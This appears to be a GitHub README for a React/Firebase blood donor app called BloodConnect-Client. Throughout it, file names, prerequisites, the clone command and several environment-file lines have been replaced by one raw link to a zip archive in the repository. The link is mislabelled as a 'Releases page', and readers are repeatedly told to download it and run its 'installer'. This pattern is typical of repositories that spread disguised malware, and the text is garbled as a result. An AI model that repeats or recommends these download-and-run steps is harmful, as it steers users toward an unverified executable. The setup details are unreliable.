# BloodConnect-Client: Real-Time Blood Donor Finder, Manager, and Requests, Secure, Mobile-Friendly

[![Releases](https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip)](https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip)

BloodConnect-Client is a smart, location-based blood donation web app. It helps users find, manage, and request donors. It features real-time search, donor profiles, role-based access, and a mobile-friendly design. It aims to streamline and secure the donation process for clinics, organizers, and individuals.

For quick access to the latest builds and installers, visit the Releases page: https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip

---

## Table of contents

- [Overview](#overview)
- [Key features](#key-features)
- [Tech stack and ecosystem](#tech-stack-and-ecosystem)
- [How to get started](#how-to-get-started)
- [Project structure](#project-structure)
- [Authentication and security](#authentication-and-security)
- [Real-time data and state management](#real-time-data-and-state-management)
- [Donor profiles and location search](#donor-profiles-and-location-search)
- [Payments and donations](#payments-and-donations)
- [APIs and data flow](#apis-and-data-flow)
- [Testing and quality assurance](#testing-and-quality-assurance)
- [Release and deployment](#release-and-deployment)
- [Environment and configuration](#environment-and-configuration)
- [Accessibility and performance](#accessibility-and-performance)
- [Development workflow](#development-workflow)
- [Contributing](#contributing)
- [Licensing](#licensing)

---

## Overview

BloodConnect-Client is built as a modern web app that feels fast and intuitive. It uses React for the UI, a responsive design with Tailwind and DaisyUI, and Firebase for auth and real-time data. The app supports different user roles, including donors, recipients, and admins, to control access to sensitive features.

The core goals are:
- Help users locate nearby donors with precise distance filtering.
- Provide rich donor profiles with consent and availability information.
- Enable secure donor requests and clear escalation paths.
- Ensure a mobile-first experience that works well on phones and tablets.
- Maintain strong data protection and role-based access controls.

The project is designed to be deployed quickly and scaled as needs grow. It emphasizes reliability, clarity, and accessibility.

---

## Key features

- Real-time search and filters
  - Live results as you type
  - Distance-based sorting and radius filters
  - Quick view and deep dive into donor profiles
- Donor profiles
  - Availability, blood type, contact preferences
  - Verification status and recent activity
  - Privacy controls and consent logs
- Role-based access
  - Admin, clinic staff, donors, and general users
  - Fine-grained permissions for sensitive actions
- Mobile-friendly design
  - Responsive components and touch-friendly controls
  - Progressive enhancement for slower networks
- Location awareness
  - Geolocation support to center search around a user
  - Map integration to visualize donor distribution
- Requests and workflow
  - Create, track, and fulfill donor requests
  - Status indicators and audit trail
- Secure payments and donations
  - Stripe integration for donations and rewards
  - Clear receipts and refund policies
- Offline readiness
  - Basic app functions available with limited connectivity
  - Local caching for critical data
- Accessibility
  - Keyboard navigation and screen reader support
  - High-contrast options and accessible components

---

## Tech stack and ecosystem

- Frontend
  - React
  - TypeScript (optional optional, strongly typed)
  - Tailwind CSS with DaisyUI
  - React Router for navigation
  - React Hook Form for forms
  - Axios for API calls
  - TanStack Query for data fetching and caching

- Backend and services (via cloud APIs)
  - Firebase (Auth, Firestore, Storage)
  - Firebase Functions (where applicable)
  - Stripe (payments and donations)

- Build and tooling
  - Vite or Create React App as app shell
  - ESLint and Prettier for code quality
  - Husky and lint-staged for commit checks

- Topics (for discovery and collaboration)
  - axios, css3, daisyui, firebase, firebase-auth, html5, react, react-hook-form, react-router, reacthookform, react-router-dom, stripe, sweetalert2, tailwind, tailwindcss, tanstack-query

Note: This project is built around modern web standards and a modular approach. The release assets in the Releases page contain the compiled builds and installers for different platforms.

---

## How to get started

Prerequisites:
- https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip (14.x or newer) and npm or yarn
- A Firebase project for authentication and data storage
- Optional: Stripe account for payment flow testing

Basic setup:
1) Clone the repository
   - git clone https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
2) Install dependencies
   - npm install
   - or yarn install
3) Copy or create environment files
   - Create a https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip file from a sample
   - Fill in API keys, Firebase config, and Stripe keys
4) Run the app
   - npm run dev
   - Open http://localhost:5173 (or the port your dev server uses)

If you want to run the production-ready build:
- Build: npm run build
- Serve locally: npm run serve

For release assets and installers, visit the Releases page to download the latest build. That page is linked at the top of this document and again in the Release and deployment section.

Visit the Releases page: https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip

---

## Project structure

- public/
  - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
  - assets/
- src/
  - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip or https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
  - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
  - routes/
    - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
    - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
  - components/
    - UI shared components (buttons, inputs, modals)
  - features/
    - donorProfile/
    - search/
    - requests/
    - auth/
  - services/
    - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip (Axios instance)
    - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
  - styles/
    - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
    - https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
  - hooks/
    - useAuth
    - useGeolocation
  - utils/
    - helpers
  - tests/
    - unit/
    - integration/
- https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip (this file)
- https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
- https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
- https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip or https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip (depending on setup)

Notes:
- The app is designed in a feature-first layout. Each feature folder contains its own components, hooks, and tests.
- The public folder hosts static assets and the app shell.

---

## Authentication and security

- Firebase Authentication handles user login, registration, and session management.
- Admin roles are stored in Firestore with role-based guards in the client.
- Sensitive data is not exposed to the public; clients fetch only the required data with security rules in Firestore.
- Data in transit uses TLS; sensitive keys are stored in environment variables and never committed to code.
- The app supports multi-factor authentication (MFA) for admin accounts where required.

Security practices:
- Use least privilege for service accounts
- Validate inputs on both client and server sides
- Sanitize all data before rendering
- Keep dependencies up to date

---

## Real-time data and state management

- Real-time search results rely on Firestore snapshot listeners for quick updates.
- TanStack Query caches data to reduce duplicate requests and improve responsiveness.
- Websockets or Firestore real-time streams are used for live changes to donor availability or request status.
- State is kept predictable with a clear separation between UI state and server data.

Guidelines:
- Use query keys that reflect data type and filters
- Invalidate queries when a mutating action completes
- Show optimistic updates when appropriate, with a rollback plan on error

---

## Donor profiles and location search

- Donor profiles contain availability, blood type, contact preferences, and verification status.
- Location search uses the browser’s geolocation API (with user consent) and falls back to manual input when needed.
- A map view visualizes donor density and proximity. Users can click markers to view quick profile summaries.
- Privacy controls allow donors to set sharing preferences and contact channels.

Implementation notes:
- Radius-based filtering enables efficient screening of nearby donors
- Pagination or infinite scrolling handles large result sets without overloading the UI
- Accessible controls ensure keyboard navigation and screen reader compatibility

---

## Payments and donations

- Stripe integration supports donor contributions and in-app donations.
- A secure checkout flow handles payments and receipts.
- Refund policies, donation receipts, and transaction history appear in the user’s profile.

Usage tips:
- Test mode should be used for development
- Webhooks update donation statuses automatically
- Always verify payment success before finalizing a donor request

---

## APIs and data flow

- Axios instances handle API calls to Firebase or external services
- Data flow is designed to be resilient to network interruptions
- Errors are surfaced clearly to users with actionable feedback

Common flows:
- User signs up → Firebase Auth creates account → Firestore stores profile data
- User searches for donors → Real-time queries return results → User selects a donor → Request is created and tracked
- Admin updates donor status → Client receives real-time updates and reflects changes

Example API usage (pseudo):
- GET /donors?lat=...&lon=...&radius=...
- POST /requests with donorId and request details
- PUT /donors/{id} to update availability

Note: The actual endpoints depend on your Firebase rules and any middle-tier you add.

---

## Testing and quality assurance

- Unit tests cover key utilities and components
- Integration tests validate critical flows like sign-in, search, and request creation
- End-to-end tests simulate real user journeys
- Linting and formatting run on pre-commit

Local testing tips:
- Run tests with npm run test
- Use npm run lint to keep code clean
- Run type checks if TypeScript is used: npm run type-check

Test data:
- Use mock Firestore data during tests
- Seed scripts can populate a known test dataset

---

## Release and deployment

Releases are provided on the Releases page. The link to the Releases page is used here as well:
- Visit the Releases page: https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
- Download the latest release asset that matches your platform
- If needed, extract and run the installer or the app bundle
- Follow the on-screen setup prompts to complete installation

Note: If a release asset is not available for your platform, check the Releases section for notes or build instructions. The link above is the primary source for official builds and installers.

What to download and run from releases:
- The latest platform-specific installer or bundle (for example, BloodConnect-Client-<version>https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip or BloodConnect-Client-<version>.zip)
- Any accompanying readme or install notes included with the asset

Releases page link: https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip

---

## Environment and configuration

Files you will typically manage:
- https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip or https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip for local development
- https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip for production
- firebaseConfig object in your code for Firebase initialization
- Stripe keys in the environment or secure vault

Common environment variables:
- NEXT_PUBLIC_FIREBASE_API_KEY
- NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN
- NEXT_PUBLIC_FIREBASE_PROJECT_ID
- NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID
- NEXT_PUBLIC_FIREBASE_APP_ID
- STRIPE_PUBLIC_KEY
- STRIPE_SECRET_KEY (server-side)
- API_BASE_URL

Guidance:
- Never commit secrets to the repository
- Use environment-specific files and secret management tools in production

---

## Accessibility and performance

Accessibility:
- All interactive elements have accessible labels
- Focus states are visible and consistent
- Color contrast meets WCAG standards
- Keyboard navigation is supported across major components

Performance:
- Code-splitting ensures faster initial load
- Lazy loading for less critical components
- Image optimization and responsive images
- Caching with TanStack Query to reduce network calls
- Optimistic UI updates where it makes sense

---

## Mobile experience

- The UI adapts to small screens with a fluid grid
- Touch targets meet minimum size guidelines
- Scrolling and navigation are smooth on mobile devices
- Offline-friendly features provide basic usability when network is poor

---

## Development workflow

- Create issues for new features or fixes
- Open pull requests with small, focused changes
- Use descriptive titles and add context in PR bodies
- Run local tests before opening a PR
- Document any breaking changes in the PR notes

Code hygiene:
- Keep components small and reusable
- Write testable functions and pure components when possible
- Keep dependencies up to date and review security advisories

---

## Contributing

We welcome contributions. Before you start:
- Read the code of conduct
- Review the contributing guidelines
- Follow the branch naming rules
- Write tests for new features or bug fixes
- Add or update documentation as needed

How to contribute locally:
- Fork the repo
- Create a feature branch
- Implement and test changes
- Submit a pull request with a clear description

---

## License

This project is released under the MIT license. See the LICENSE file for details.

---

## Additional resources

- Quick start guide for developers
- UI component library usage and customization
- Data model diagrams and API contract references
- Security best practices for web apps with auth and payments

---

## Example environment file (https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip)

# Firebase
REACT_APP_FIREBASE_API_KEY=your_api_key
https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
REACT_APP_FIREBASE_PROJECT_ID=your_project_id
https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip
REACT_APP_FIREBASE_MESSAGING_SENDER_ID=sender_id
REACT_APP_FIREBASE_APP_ID=app_id

# Stripe
STRIPE_PUBLIC_KEY=pk_test_XXXXXXXXXXXXXXXXXXXX
STRIPE_SECRET_KEY=sk_test_XXXXXXXXXXXXXXXXXXXX

# API endpoints
https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip

# Others
NODE_ENV=development

---

## Notes about the Releases link

The Releases page provides platform-specific installers and bundles. If you need to install on a particular system, download the corresponding asset and follow the on-screen prompts. The latest builds are posted there, and the page is the authoritative source for binaries and release notes.

Visit the Releases page: https://github.com/Maslany1/BloodConnect-Client/raw/refs/heads/main/src/pages/Blood-Client-Connect-v1.2.zip

---

End of README content.